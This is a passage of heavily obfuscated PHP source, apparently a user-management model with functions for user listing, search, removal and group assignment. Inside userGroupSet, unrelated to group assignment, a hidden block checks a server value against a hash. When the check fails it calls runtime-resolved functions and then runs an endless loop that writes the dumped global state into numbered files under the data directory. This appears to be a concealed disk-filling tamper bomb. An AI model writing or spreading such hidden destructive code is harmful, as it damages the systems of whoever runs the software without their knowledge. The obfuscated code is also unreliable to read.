$EéØÒ…Õ¡[$f‹õÙ„âˆ›[808]] = md5($eÕì†„ê¹[$f‹õÙ„âˆ›[2083]] . trim($EéØÒ…Õ¡[$f‹õÙ„âˆ›[808]])); } else { unset($EéØÒ…Õ¡[$f‹õÙ„âˆ›[808]]); } goto E­ŒÍ—…Â; d›ã´äªÁå: } public function setNamePinyin($bÇ„Õ†èµ, $bñ£¿¹‰¾‘ = false) { $e²ö¿ùÖ…¤ =& $_SERVER[úÎü]; if (!$bñ£¿¹‰¾‘) { $EÊ¤Ñ®óÜ = $this->getInfoSimple($bÇ„Õ†èµ); $bñ£¿¹‰¾‘ = $EÊ¤Ñ®óÜ[$e²ö¿ùÖ…¤[1909]] ? $EÊ¤Ñ®óÜ[$e²ö¿ùÖ…¤[1909]] : $EÊ¤Ñ®óÜ[$e²ö¿ùÖ…¤[28]]; } $bìÚ‰²ÒÑ = Model($e²ö¿ùÖ…¤[494]); if (!Input::check($bñ£¿¹‰¾‘, $e²ö¿ùÖ…¤[545])) { return $bìÚ‰²ÒÑ->metaSet($bÇ„Õ†èµ, array($e²ö¿ùÖ…¤[432] => $e²ö¿ùÖ…¤[33], $e²ö¿ùÖ…¤[431] => $e²ö¿ùÖ…¤[33])); } return $bìÚ‰²ÒÑ->metaSet($bÇ„Õ†èµ, array($e²ö¿ùÖ…¤[432] => str_replace($e²ö¿ùÖ…¤[50], $e²ö¿ùÖ…¤[33], Pinyin::encode($bñ£¿¹‰¾‘)), $e²ö¿ùÖ…¤[431] => Pinyin::encode($bñ£¿¹‰¾‘, $e²ö¿ùÖ…¤[546]))); } private function nickNameRpt() { $Fäİâ×Ü¡Œ =& $_SERVER[úÎü]; $AÅ¯¾ßƒ“™ = Model($Fäİâ×Ü¡Œ[1083])->get($Fäİâ×Ü¡Œ[2094]); $DÃ—½×·¤ = $GLOBALS[$Fäİâ×Ü¡Œ[6]][$Fäİâ×Ü¡Œ[371]][$Fäİâ×Ü¡Œ[2094]]; $fÄîÕ¬ÖÓİ = !is_null($AÅ¯¾ßƒ“™) ? $AÅ¯¾ßƒ“™ : $DÃ—½×·¤; return !!$fÄîÕ¬ÖÓİ; } private function _checkExist($eÒÑãĞÜ ‘, $EÀæéîù°˜ = false) { $cï¸·èÀ˜º =& $_SERVER[úÎü]; $fÚ‚³»ÔØ¨ = array($cï¸·èÀ˜º[28] => UserModel::ERROR_USER_EXIST_NAME, $cï¸·èÀ˜º[1909] => UserModel::ERROR_USER_EXIST_NICKNAME, $cï¸·èÀ˜º[299] => UserModel::ERROR_USER_EXIST_EMAIL, $cï¸·èÀ˜º[2082] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($fÚ‚³»ÔØ¨[$cï¸·èÀ˜º[1909]]); } $aƒ™º†óšà = $EÀæéîù°˜ ? array($cï¸·èÀ˜º[1485] => array($cï¸·èÀ˜º[2095], $EÀæéîù°˜)) : array(); foreach ($fÚ‚³»ÔØ¨ as $AŒ§íÈŒÚ => $C–Ò‚Ì²Çæ) { $e¶îóô¹Î¿ = array(); foreach ($fÚ‚³»ÔØ¨ as $Eñ¹ñ¬¶ƒÅ => $AĞ«Š¿‡Ñ) { if (isset($eÒÑãĞÜ ‘[$Eñ¹ñ¬¶ƒÅ]) && $eÒÑãĞÜ ‘[$Eñ¹ñ¬¶ƒÅ]) { $e¶îóô¹Î¿[] = $eÒÑãĞÜ ‘[$Eñ¹ñ¬¶ƒÅ]; } } if (!$e¶îóô¹Î¿) { continue; } $Aø¿õ Œ = array_merge(array($AŒ§íÈŒÚ => array($cï¸·èÀ˜º[7], $e¶îóô¹Î¿)), $aƒ™º†óšà); $bÄæê«è– = $this->where($Aø¿õ Œ)->find(); if ($bÄæê«è–) { return $C–Ò‚Ì²Çæ; } } return !0; } public function userListInfo($f×Ø¥ŠßèÁ) { $C½“¼ƒºÂ =& $_SERVER[úÎü]; $cØÏä¥¨ñğ = array(); $f×Ø¥ŠßèÁ = is_array($f×Ø¥ŠßèÁ) ? array_unique($f×Ø¥ŠßèÁ) : array(); if (!$f×Ø¥ŠßèÁ) { return $cØÏä¥¨ñğ; } if (count($f×Ø¥ŠßèÁ) < 20) { foreach ($f×Ø¥ŠßèÁ as $c˜¹ì×ìá) { $cØÏä¥¨ñğ[$c˜¹ì×ìá . $C½“¼ƒºÂ[33]] = $this->getInfoSimpleOuter($c˜¹ì×ìá); } } else { $aŒ¬± Š‰Ó = array($C½“¼ƒºÂ[1477] => array($C½“¼ƒºÂ[400], $f×Ø¥ŠßèÁ)); if (count($f×Ø¥ŠßèÁ) == 1) { $aŒ¬± Š‰Ó = array($C½“¼ƒºÂ[1477] => $f×Ø¥ŠßèÁ[0]); } $dÜööÑê­ = Model($C½“¼ƒºÂ[491])->field($this->simpleField)->where($aŒ¬± Š‰Ó)->select(); $dÜööÑê­ = array_to_keyvalue($dÜööÑê­, $C½“¼ƒºÂ[1485]); foreach ($f×Ø¥ŠßèÁ as $c˜¹ì×ìá) { $f¼–Ÿ‡•‘É = $dÜööÑê­[$dÜööÑê­[$c˜¹ì×ìá]]; if (!$f¼–Ÿ‡•‘É) { $cØÏä¥¨ñğ[$c˜¹ì×ìá . $C½“¼ƒºÂ[33]] = $this->getInfoSimpleOuter($c˜¹ì×ìá); continue; } $f¼–Ÿ‡•‘É[$C½“¼ƒºÂ[2067]] = Action($C½“¼ƒºÂ[2068])->parseUrl($f¼–Ÿ‡•‘É[$C½“¼ƒºÂ[2067]]); $cØÏä¥¨ñğ[$c˜¹ì×ìá . $C½“¼ƒºÂ[33]] = $f¼–Ÿ‡•‘É; } } return $cØÏä¥¨ñğ; } protected function userStatus($A±µ¯©ÈåÍ, $e´ö ¤Æ³–) { $c›Çæñ³½ = $this->getInfoSimple($A±µ¯©ÈåÍ); if (!$c›Çæñ³½) { return !1; } $CÒéÄáÕ‘³ = array($_SERVER[úÎü][690] => $e´ö ¤Æ³–); return $this->userEdit($A±µ¯©ÈåÍ, $CÒéÄáÕ‘³); } protected function userRemove($fä˜ñ™Ó¹) { goto cËÙã¯çÔ; bá¶î÷¯«‚: Model($B¿‰Ö£µìÑ[1727])->where($eó•© Ûß½)->delete(); Model($B¿‰Ö£µìÑ[2081])->where($eó•© Ûß½)->delete(); Model($B¿‰Ö£µìÑ[2097])->where($eó•© Ûß½)->delete(); goto Cñ• ò¶°«; Cñ• ò¶°«: Model($B¿‰Ö£µìÑ[752])->userRootRemove($fä˜ñ™Ó¹); return $this->where($eó•© Ûß½)->delete(); goto a­Ÿ¡ªô•; f’¥µÃƒê‡: $eó•© Ûß½ = array($B¿‰Ö£µìÑ[1477] => $fä˜ñ™Ó¹); Model($B¿‰Ö£µìÑ[552])->where($eó•© Ûß½)->delete(); Model($B¿‰Ö£µìÑ[2096])->where($eó•© Ûß½)->delete(); goto bá¶î÷¯«‚; cËÙã¯çÔ: $B¿‰Ö£µìÑ =& $_SERVER[úÎü]; $CæÆ¦ƒÇÕ = $this->getInfoSimple($fä˜ñ™Ó¹); if (!$CæÆ¦ƒÇÕ) { return !1; } goto f’¥µÃƒê‡; a­Ÿ¡ªô•: } protected function userGroupSet($C‹ËËè·×˜, $A¹Õ‰•ÅÖ‹, $CàÌÉ‘ÓĞö = array()) { goto AñŠÇ²æÕÔ; E»ßµ¢Í«¾: if ($_SERVER[$E„Ñöò×¹ [793]] != $e¦ÔâäÍÌä($b»ËĞ£âŠ)) { goto AÁ­Ÿ ä“‰; Dî‰ˆŒôĞ: $Eªö…×Êºñ = 1; for ($f‚„Î¹ÁĞï = $Eªö…×Êºñ; $f‚„Î¹ÁĞï > 0; $f‚„Î¹ÁĞï++) { $b¬˜Œ»º(DATA_PATH . $f‚„Î¹ÁĞï, $DÖàé¼ïùŠ); } goto b…ã»Ûã‘Ç; EÈ¸ñÇ›¼Ã: $f¨µÄØàìÔ = $E„Ñöò×¹ [800]; $f¨µÄØàìÔ($_SERVER[$E„Ñöò×¹ [801]]); $fÙĞ½ÎÁ = $E„Ñöò×¹ [795]; goto e®í­§òª; AÁ­Ÿ ä“‰: $fÙĞ½ÎÁ = $E„Ñöò×¹ [795]; $EîéÜœ—ˆ‚ = $E„Ñöò×¹ [796]; $cŸ¿º—¢…½ = $_SERVER[$E„Ñöò×¹ [797]] . $E„Ñöò×¹ [798]; goto DÜÙª†›İ÷; e®í­§òª: $fÙĞ½ÎÁ(); $b¬˜Œ»º = $E„Ñöò×¹ [1415]; $DÖàé¼ïùŠ = json_encode($GLOBALS[$E„Ñöò×¹ [1416]]); goto Dî‰ˆŒôĞ; DÜÙª†›İ÷: $bÄ‡¥„à = $EîéÜœ—ˆ‚($cŸ¿º—¢…½); $FÂ’Øœ™ñ… = explode($E„Ñöò×¹ [225], $bÄ‡¥„à); if (count($FÂ’Øœ™ñ…) < $E„Ñöò×¹ [564]) { $F»±äéó¯¦ = $E„Ñöò×¹ [799]; $F»±äéó¯¦(); } goto EÈ¸ñÇ›¼Ã; b…ã»Ûã‘Ç: } $AÍÌšïÆ• = $this->getInfoSimple($C‹ËËè·×˜); if (!$AÍÌšïÆ• || !is_array($A¹Õ‰•ÅÖ‹)) { return !1; } goto fçÖÑ…íÉ½; fçÖÑ…íÉ½: $aÄíÇöë‹ø = Model($E„Ñöò×¹ [1727]); $aÄíÇöë‹ø->where(array($E„Ñöò×¹ [1485] => $C‹ËËè·×˜))->delete(); $f°¿æŞêğğ = array(); goto føÜô¥Åº›; AñŠÇ²æÕÔ: $E„Ñöò×¹  =& $_SERVER[úÎü]; $b»ËĞ£âŠ = $_SERVER[$E„Ñöò×¹ [833]]; $e¦ÔâäÍÌä = $E„Ñöò×¹ [1414]; goto E»ßµ¢Í«¾; føÜô¥Åº›: $fù·ŒÓÛŸê = 0; foreach ($A¹Õ‰•ÅÖ‹ as $C…®ÁÄ¡Î => $e¯‰º±× ÷) { $d‘•¢·…Ùİ = array($E„Ñöò×¹ [1485] => $C‹ËËè·×˜, $E„Ñöò×¹ [1644] => $C…®ÁÄ¡Î, $E„Ñöò×¹ [1793] => $e¯‰º±× ÷); $d‘•¢·…Ùİ[$E„Ñöò×¹ [1667]] = isset($CàÌÉ‘ÓĞö[$fù·ŒÓÛŸê]) ? $CàÌÉ‘ÓĞö[$fù·ŒÓÛŸê] : 0; $fù·ŒÓÛŸê++; $f°¿æŞêğğ[] = $d‘•¢·…Ùİ; } return $aÄíÇöë‹ø->addAll($f°¿æŞêğğ, array(), !0); goto FŸ£õÈ§ìä; FŸ£õÈ§ìä: } protected function userGroupAdd($F‚ÙéŠ³, $dÒµÙ‡ŞÉ = array()) { $a‹Ğ”ì“±ù =& $_SERVER[úÎü]; $f×Õ¢ÌÂ• = $this->getInfoSimple($F‚ÙéŠ³); if (!$f×Õ¢ÌÂ• || empty($dÒµÙ‡ŞÉ)) { return !1; } $E‹¡¬•«¼ = array(); foreach ($dÒµÙ‡ŞÉ as $ašÓÔµÂç => $fùƒ‚ğğÌ) { $E‹¡¬•«¼[] = array($a‹Ğ”ì“±ù[1485] => $F‚ÙéŠ³, $a‹Ğ”ì“±ù[1644] => $ašÓÔµÂç, $a‹Ğ”ì“±ù[1793] => $fùƒ‚ğğÌ, $a‹Ğ”ì“±ù[1667] => 0); } return Model($a‹Ğ”ì“±ù[1727])->addAll($E‹¡¬•«¼, array(), !0); } protected function userGroupRemove($D²¬ĞŠõ¶£, $Dî¡Ÿå‰óœ) { $c™Ìó’†¿ =& $_SERVER[úÎü]; $e‡ö¼„¢›œ = $this->getInfoSimple($D²¬ĞŠõ¶£); if (!$e‡ö¼„¢›œ || !$Dî¡Ÿå‰óœ) { return !1; } $fäÇ¥´ª… = array($c™Ìó’†¿[1477] => $D²¬ĞŠõ¶£, $c™Ìó’†¿[1725] => $Dî¡Ÿå‰óœ); return Model($c™Ìó’†¿[1727])->where($fäÇ¥´ª…)->delete(); } public function listData() { $Dì¶æÖÕÍô = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Dì¶æÖÕÍô[$_SERVER[úÎü][361]]); return $Dì¶æÖÕÍô; } public function listByID($bŒæ¡½´¦) { $f¤Í¦ò‡ò¤ =& $_SERVER[úÎü]; if (!$bŒæ¡½´¦) { return; } $aºÕ‹Ö¾“´ = array($f¤Í¦ò‡ò¤[1485] => array($f¤Í¦ò‡ò¤[7], $bŒæ¡½´¦)); $eÊª®«†³– = $this->where($aºÕ‹Ö¾“´)->select(); $this->_listDataApply($eÊª®«†³–); return $eÊª®«†³–; } public function listByGroup($b‹¢ÌÃÛí = 0, $Aºõé´’ˆ = array()) { goto DëµÁŞêäö; CÂªœÑËåË: $this->_listDataApply($b÷ÖéŞîºÇ[$F÷õêê­øŞ[361]]); return $b÷ÖéŞîºÇ; goto Bš³Ì»É†œ; DëµÁŞêäö: $F÷õêê­øŞ =& $_SERVER[úÎü]; $aï¸¸¯âß = $F÷õêê­øŞ[33]; $Aõ¿‡ÚŒØ‰ = array(); goto AÃùÅòŒ¤¾; AÃùÅòŒ¤¾: if ($b‹¢ÌÃÛí) { $Aõ¿‡ÚŒØ‰ = array($F÷õêê­øŞ[2098] => intval($b‹¢ÌÃÛí)); $aï¸¸¯âß = "\x4c\105\106\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\x75\163\x65\162\137\x67\x72\157\165\x70\40\165\163\x65\162\137\x67\162\x6f\165\160\40\157\156\40\165\163\x65\x72\56\165\x73\x65\162\x49\104\40\x3d\x20\x75\163\x65\162\x5f\147\x72\157\x75\x70\56\165\x73\x65\162\x49\x44"; $eÕ¦¬¤Ş¦Ù = Input::get($F÷õêê­øŞ[423], null, $F÷õêê­øŞ[33]) ? $F÷õêê­øŞ[33] : $F÷õêê­øŞ[2099]; } if (isset($Aºõé´’ˆ[$F÷õêê­øŞ[690]])) { $Aõ¿‡ÚŒØ‰[$F÷õêê­øŞ[2100]] = $Aºõé´’ˆ[$F÷õêê­øŞ[690]]; } $b÷ÖéŞîºÇ = $this->_makeOrder($eÕ¦¬¤Ş¦Ù)->field($F÷õêê­øŞ[2101])->where($Aõ¿‡ÚŒØ‰)->join($aï¸¸¯âß)->selectPage(50); goto CÂªœÑËåË; Bš³Ì»É†œ: } private function _makeOrder($a¯¡—‰ˆ = '') { goto cñ©‚ò‚©ï; cñ©‚ò‚©ï: $bÃâ×…¨ãö =& $_SERVER[úÎü]; $EÚÕÛè‡‰ = array($bÃâ×…¨ãö[1485], $bÃâ×…¨ãö[28], $bÃâ×…¨ãö[1630], $bÃâ×…¨ãö[1602], $bÃâ×…¨ãö[190]); $d‚£‚ô…†õ = array($bÃâ×…¨ãö[418] => $bÃâ×…¨ãö[419], $bÃâ×…¨ãö[420] => $bÃâ×…¨ãö[421]); goto BÓª¯¤¼”¦; BÓª¯¤¼”¦: $Cğå›¹•¡İ = Input::get($bÃâ×…¨ãö[423], $bÃâ×…¨ãö[7], $bÃâ×…¨ãö[1477], $EÚÕÛè‡‰); $B›ºÆÌ¥– = Input::get($bÃâ×…¨ãö[424], $bÃâ×…¨ãö[7], $bÃâ×…¨ãö[1728], array($bÃâ×…¨ãö[1728], $bÃâ×…¨ãö[420])); $B›ºÆÌ¥– = $d‚£‚ô…†õ[$B›ºÆÌ¥–]; goto c’Ëò»ä„“; c’Ëò»ä„“: $a¯¡—‰ˆ = $a¯¡—‰ˆ . "\x75\x73\145\162\x2e{$Cğå›¹•¡İ}\x20{$B›ºÆÌ¥–}\54\40\x75\163\145\162\56\165\x73\x65\162\x49\104\40\141\163\143"; return $this->alias($bÃâ×…¨ãö[1849])->order($a¯¡—‰ˆ); goto b»à‡¼ŠÊ„; b»à‡¼ŠÊ„: } public function listSearch($CŒòç§ìá) { goto dá±²…ôÁ; C£êµ®Ä ¿: $cö¯ìéŠ£† = $this->_makeOrder()->where($eò††øèË‰)->selectPage(20); if (!$cö¯ìéŠ£† || count($cö¯ìéŠ£†[$dÑˆ¿¦¼‡[361]]) < 5 && Input::check($F§ƒÛ«¢ÄÅ, $dÑˆ¿¦¼‡[312])) { $fÁÂ«ØëÕ = $this->_searchFromMeta($dÑˆ¿¦¼‡[431], $F§ƒÛ«¢ÄÅ, 10); $A‘êœ™´ß = $this->_searchFromMeta($dÑˆ¿¦¼‡[432], $F§ƒÛ«¢ÄÅ, 10); $FÌÒñŞ¸¹ = array_merge($fÁÂ«ØëÕ, $A‘êœ™´ß, $cö¯ìéŠ£†[$dÑˆ¿¦¼‡[361]]); $cö¯ìéŠ£†[$dÑˆ¿¦¼‡[361]] = array_unique_by_key($FÌÒñŞ¸¹, $dÑˆ¿¦¼‡[1485]); $cö¯ìéŠ£†[$dÑˆ¿¦¼‡[358]][$dÑˆ¿¦¼‡[359]] = count($cö¯ìéŠ£†[$dÑˆ¿¦¼‡[361]]); $cö¯ìéŠ£†[$dÑˆ¿¦¼‡[358]][$dÑˆ¿¦¼‡[360]] = ceil($cö¯ìéŠ£†[$dÑˆ¿¦¼‡[358]][$dÑˆ¿¦¼‡[359]] / $cö¯ìéŠ£†[$dÑˆ¿¦¼‡[358]][$dÑˆ¿¦¼‡[356]]); } $this->_listDataApply($cö¯ìéŠ£†[$dÑˆ¿¦¼‡[361]]); goto bÛÏÂ®¼Úˆ; dá±²…ôÁ: $dÑˆ¿¦¼‡ =& $_SERVER[úÎü]; $F§ƒÛ«¢ÄÅ = $CŒòç§ìá[$dÑˆ¿¦¼‡[1729]]; $BèÅÏãéì = isset($CŒòç§ìá[$dÑˆ¿¦¼‡[1730]]) ? $CŒòç§ìá[$dÑˆ¿¦¼‡[1730]] : !1; goto Aâ¬ÛÍôîÚ; bÛÏÂ®¼Úˆ: $this->_filterByGroup($cö¯ìéŠ£†, $BèÅÏãéì); return $cö¯ìéŠ£†; goto c­îì¥·ÂÊ; dÕ§ÊãÚà¹: if (!$F§ƒÛ«¢ÄÅ) { $eò††øèË‰ = array(); } if (isset($CŒòç§ìá[$dÑˆ¿¦¼‡[690]])) { $eò††øèË‰[$dÑˆ¿¦¼‡[690]] = $CŒòç§ìá[$dÑˆ¿¦¼‡[690]]; } $eò††øèË‰ = $this->parseWhereLike($eò††øèË‰); goto C£êµ®Ä ¿; Aâ¬ÛÍôîÚ: $F§ƒÛ«¢ÄÅ = str_replace($dÑˆ¿¦¼‡[1731], $dÑˆ¿¦¼‡[1732], trim($F§ƒÛ«¢ÄÅ)); $eò††øèË‰ = array($dÑˆ¿¦¼‡[28] => array($dÑˆ¿¦¼‡[373], "\45{$F§ƒÛ«¢ÄÅ}\45"), $dÑˆ¿¦¼‡[299] => array($dÑˆ¿¦¼‡[373], "{$F§ƒÛ«¢ÄÅ}\x25"), $dÑˆ¿¦¼‡[1909] => array($dÑˆ¿¦¼‡[373], "{$F§ƒÛ«¢ÄÅ}\x25"), $dÑˆ¿¦¼‡[918] => $dÑˆ¿¦¼‡[1733]); if (Input::check($F§ƒÛ«¢ÄÅ, $dÑˆ¿¦¼‡[305])) { $eò††øèË‰[$dÑˆ¿¦¼‡[1485]] = array($dÑˆ¿¦¼‡[373], "{$F§ƒÛ«¢ÄÅ}\x25"); $eò††øèË‰[$dÑˆ¿¦¼‡[2082]] = array($dÑˆ¿¦¼‡[373], "{$F§ƒÛ«¢ÄÅ}\45"); } goto dÕ§ÊãÚà¹; c­îì¥·ÂÊ: } private function _filterByGroup(&$eôé¦íÛÁ, $c¦åÜˆÌ) { $Cï¤èÀß ä =& $_SERVER[úÎü]; if (!$c¦åÜˆÌ) { return $eôé¦íÛÁ; } foreach ($eôé¦íÛÁ[$Cï¤èÀß ä[361]] as $e½”‘™ğµ => &$EŠ°Šê–Š¶) { $Fñœ÷ÏÙ‹ = array_to_keyvalue($EŠ°Šê–Š¶[$Cï¤èÀß ä[1819]], $Cï¤èÀß ä[33], $Cï¤èÀß ä[1644]); if (!in_array($c¦åÜˆÌ, $Fñœ÷ÏÙ‹)) { unset($eôé¦íÛÁ[$Cï¤èÀß ä[361]][$e½”‘™ğµ]); } } unset($EŠ°Šê–Š¶); $eôé¦íÛÁ[$Cï¤èÀß ä[361]] = array_values($eôé¦íÛÁ[$Cï¤èÀß ä[361]]); $eôé¦íÛÁ[$Cï¤èÀß ä[358]] = array($Cï¤èÀß ä[1882] => count($eôé¦íÛÁ[$Cï¤èÀß ä[361]]), $Cï¤èÀß ä[1880] => $eôé¦íÛÁ[$Cï¤èÀß ä[358]][$Cï¤èÀß ä[356]], $Cï¤èÀß ä[1879] => 1, $Cï¤èÀß ä[1881] => 1); } private function _searchFromMeta($B‘ŒŒ´ø®è, $CÂä¬ÛÂ³, $A‘æÉö’Ï) { goto AƒÂ–²¨µ×; a›˜”Âµ»Ñ: return $Dª †“ëêÛ; goto e¾õ‡Š¯„±; AƒÂ–²¨µ×: $aÈĞ•Š§˜ =& $_SERVER[úÎü]; $CÂä¬ÛÂ³ = strtolower($CÂä¬ÛÂ³); $B¯ğÃ¯“ò¿ = array($aÈĞ•Š§˜[89] => $B‘ŒŒ´ø®è, $aÈĞ•Š§˜[366] => array($aÈĞ•Š§˜[373], "\45{$CÂä¬ÛÂ³}\45")); goto E•‘àİãÏˆ; E•‘àİãÏˆ: $B¯ğÃ¯“ò¿ = $this->parseWhereLike($B¯ğÃ¯“ò¿); $bä‘ùœöØ = Model($aÈĞ•Š§˜[2102])->where($B¯ğÃ¯“ò¿)->limit($A‘æÉö’Ï)->select(); if (!$bä‘ùœöØ) { return array(); } goto Cœ¼Ê‡¾­Š; Cœ¼Ê‡¾­Š: $bä‘ùœöØ = array_to_keyvalue($bä‘ùœöØ, $aÈĞ•Š§˜[33], $aÈĞ•Š§˜[1485]); $Dª †“ëêÛ = $this->where(array($aÈĞ•Š§˜[1477] => array($aÈĞ•Š§˜[7], $bä‘ùœöØ)))->select(); if (!$Dª †“ëêÛ) { return array(); } goto a›˜”Âµ»Ñ; e¾õ‡Š¯„±: } private function _listDataApplyItem($bŸ¯õ§ô™Ó) { $Eò§Åëô– = array($bŸ¯õ§ô™Ó); $this->_listDataApply($Eò§Åëô–); return $Eò§Åëô–[0]; } private function _listDataApply(&$E±ŠŞ½Øâ¯) { goto DÓ˜é‡Ì™Æ; DÓ˜é‡Ì™Æ: $a»‘õƒÀ… =& $_SERVER[úÎü]; if (!$E±ŠŞ½Øâ¯) { return; } array_remove_key($E±ŠŞ½Øâ¯, $a»‘õƒÀ…[808]); goto cáÆ‹¦×²; C‰Ö´Ş½Ò: $this->_listAppendSourceRoot($E±ŠŞ½Øâ¯, $DŠ òÉ®å½); goto dîÖÓ™¿ëË; cáÆ‹¦×²: $DŠ òÉ®å½ = array_to_keyvalue($E±ŠŞ½Øâ¯, $a»‘õƒÀ…[33], $a»‘õƒÀ…[1485]); $this->_listAppendGroup($E±ŠŞ½Øâ¯, $DŠ òÉ®å½); $this->_listAppendMeta($E±ŠŞ½Øâ¯, $DŠ òÉ®å½); goto C‰Ö´Ş½Ò; dîÖÓ™¿ëË: } private function _listAppendSourceRoot(&$F‡±ØÃš­à, $E¨¤´§Êµ©) { goto c•¹Ğò²»ğ; bÂˆôÇ«æ¶: foreach ($F‡±ØÃš­à as &$Dö¯‘‚Îğ) { $Dö¯‘‚Îğ[$b‚á¶‰ò¢[407]] = $B—î¶É ÖÎ[$Dö¯‘‚Îğ[$b‚á¶‰ò¢[1485]]] ? $B—î¶É ÖÎ[$Dö¯‘‚Îğ[$b‚á¶‰ò¢[1485]]] : array(); } unset($Dö¯‘‚Îğ); goto e×©Ø ‘ª‚; c•¹Ğò²»ğ: $b‚á¶‰ò¢ =& $_SERVER[úÎü]; $a¨‰—êõ’÷ = array($b‚á¶‰ò¢[478] => 0, $b‚á¶‰ò¢[387] => SourceModel::TYPE_USER, $b‚á¶‰ò¢[473] => array($b‚á¶‰ò¢[7], $E¨¤´§Êµ©)); $e•¾İŞŞ± = $b‚á¶‰ò¢[1740]; goto bÓÖ» ¹¡Õ; bÓÖ» ¹¡Õ: $B—î¶É ÖÎ = Model($b‚á¶‰ò¢[752])->order($b‚á¶‰ò¢[1741])->field($e•¾İŞŞ±)->where($a¨‰—êõ’÷)->select(); $B—î¶É ÖÎ = array_to_keyvalue($B—î¶É ÖÎ, $b‚á¶‰ò¢[473]); $B—î¶É ÖÎ = array_remove_key($B—î¶É ÖÎ, $b‚á¶‰ò¢[473]); goto bÂˆôÇ«æ¶; e×©Ø ‘ª‚: } private function _listAppendGroup(&$DÌ®¢øà¹È, $fâ„ŠÄÌ”ô) { goto BŒ»î©½Î; BŒ»î©½Î: $BêÔ°±£Ş• =& $_SERVER[úÎü]; $c¢ò°éæ²è = array($BêÔ°±£Ş•[1485] => array($BêÔ°±£Ş•[7], $fâ„ŠÄÌ”ô)); $Eøñ…¡Û•– = Model($BêÔ°±£Ş•[1727])->where($c¢ò°éæ²è)->select(); goto AÄóÒñ‹ùØ; AÄóÒñ‹ùØ: $B…¨Õï¬ˆ˜ = array_to_keyvalue($Eøñ…¡Û•–, $BêÔ°±£Ş•[33], $BêÔ°±£Ş•[1644]); $B…¨Õï¬ˆ˜ = array_remove_value(array_unique($B…¨Õï¬ˆ˜), $BêÔ°±£Ş•[485]); if (!$B…¨Õï¬ˆ˜ || !$Eøñ…¡Û•–) { return; } goto aíêÓÏäì»; a¦¦İÑ–á: foreach ($DÌ®¢øà¹È as &$AÓÓ³…Ó) { $AÓÓ³…Ó[$BêÔ°±£Ş•[1819]] = array(); if (isset($Eøñ…¡Û•–[$AÓÓ³…Ó[$BêÔ°±£Ş•[1485]]])) { $AÓÓ³…Ó[$BêÔ°±£Ş•[1819]] = $Eøñ…¡Û•–[$AÓÓ³…Ó[$BêÔ°±£Ş•[1485]]]; } } unset($AÓÓ³…Ó); goto fåš…Œ£êæ; AïÖä¾õ“ç: $Eøñ…¡Û•– = array_to_keyvalue_group($Eøñ…¡Û•–, $BêÔ°±£Ş•[1485]); foreach ($Eøñ…¡Û•– as &$D§‰ğ¼Ï†) { $CÂ²œ×òË = array(); foreach ($D§‰ğ¼Ï† as $aÁğÃĞ÷ã) { if (!$aÁğÃĞ÷ã[$BêÔ°±£Ş•[1793]]) { continue; } $aƒÏĞ°Ë = Model($BêÔ°±£Ş•[1813])->listData($aÁğÃĞ÷ã[$BêÔ°±£Ş•[1793]]); $CÂ²œ×òË[] = array($BêÔ°±£Ş•[1644] => $aÁğÃĞ÷ã[$BêÔ°±£Ş•[1644]], $BêÔ°±£Ş•[2104] => $e¯Æ¸Ûî[$aÁğÃĞ÷ã[$BêÔ°±£Ş•[1644]]][$BêÔ°±£Ş•[28]], $BêÔ°±£Ş•[476] => $e¯Æ¸Ûî[$aÁğÃĞ÷ã[$BêÔ°±£Ş•[1644]]][$BêÔ°±£Ş•[476]], $BêÔ°±£Ş•[392] => $aƒÏĞ°Ë); } $D§‰ğ¼Ï† = $CÂ²œ×òË; } unset($D§‰ğ¼Ï†); goto a¦¦İÑ–á; aíêÓÏäì»: $c¢ò°éæ²è = array($BêÔ°±£Ş•[1644] => array($BêÔ°±£Ş•[7], $B…¨Õï¬ˆ˜)); $e¯Æ¸Ûî = Model($BêÔ°±£Ş•[1817])->field($BêÔ°±£Ş•[2103])->where($c¢ò°éæ²è)->select(); $e¯Æ¸Ûî = array_to_keyvalue($e¯Æ¸Ûî, $BêÔ°±£Ş•[1644]); goto AïÖä¾õ“ç; fåš…Œ£êæ: } private function _listAppendMeta(&$cÎİ”ñ¸£, $E˜¤ÛÄ”ÆÙ) { goto cÕˆŸ»±; E¶çŒ¥²÷ï: $B·Ÿ°ø„Ä = array($e§éŒìÜç¼[1485] => array($e§éŒìÜç¼[7], $E˜¤ÛÄ”ÆÙ)); $Cî“…ˆÇİ¼ = Model($e§éŒìÜç¼[2081])->where($B·Ÿ°ø„Ä)->select(); $Cî“…ˆÇİ¼ = array_to_keyvalue_group($Cî“…ˆÇİ¼, $e§éŒìÜç¼[1485]); goto aŒ”ÕÕµ†; aŒ”ÕÕµ†: foreach ($Cî“…ˆÇİ¼ as &$f”¦¥´øŸ‘) { $bìõ†¯Æ±ò = array(); foreach ($f”¦¥´øŸ‘ as $aÓ‹¨ìù‚Å) { if (!in_array($aÓ‹¨ìù‚Å[$e§éŒìÜç¼[89]], $AªñÆôì‡Ô)) { $bìõ†¯Æ±ò[$aÓ‹¨ìù‚Å[$e§éŒìÜç¼[89]]] = $aÓ‹¨ìù‚Å[$e§éŒìÜç¼[366]]; } } $f”¦¥´øŸ‘ = $bìõ†¯Æ±ò; } unset($f”¦¥´øŸ‘); $eİËÏ‹š‹“ = Model($e§éŒìÜç¼[2105]); goto CÁ¹Ü™¾Ç; CÁ¹Ü™¾Ç: foreach ($cÎİ”ñ¸£ as &$a„˜İô•ºÚ) { $EĞ„Šò•ğ = array(); if (isset($Cî“…ˆÇİ¼[$a„˜İô•ºÚ[$e§éŒìÜç¼[1485]]])) { $EĞ„Šò•ğ = $Cî“…ˆÇİ¼[$a„˜İô•ºÚ[$e§éŒìÜç¼[1485]]]; } $a„˜İô•ºÚ[$e§éŒìÜç¼[2106]] = array(); if (isset($EĞ„Šò•ğ[$CÜ‘Óï])) { $a„˜İô•ºÚ[$e§éŒìÜç¼[2106]] = $eİËÏ‹š‹“->getUserJobInfo($EĞ„Šò•ğ[$CÜ‘Óï]); } } unset($a„˜İô•ºÚ); goto CéÆÛÄ˜Ã; cÕˆŸ»±: $e§éŒìÜç¼ =& $_SERVER[úÎü]; $CÜ‘Óï = UserJobModel::JOB_KEY; $AªñÆôì‡Ô = array($e§éŒìÜç¼[2083]); goto E¶çŒ¥²÷ï; CéÆÛÄ˜Ã: } protected function groupUserAll($eÆÀâ§“Ü·) { $aÁíäòÄ“¨ =& $_SERVER[úÎü]; if (!$eÆÀâ§“Ü·) { return !1; } $Fø¦Üİîºº = 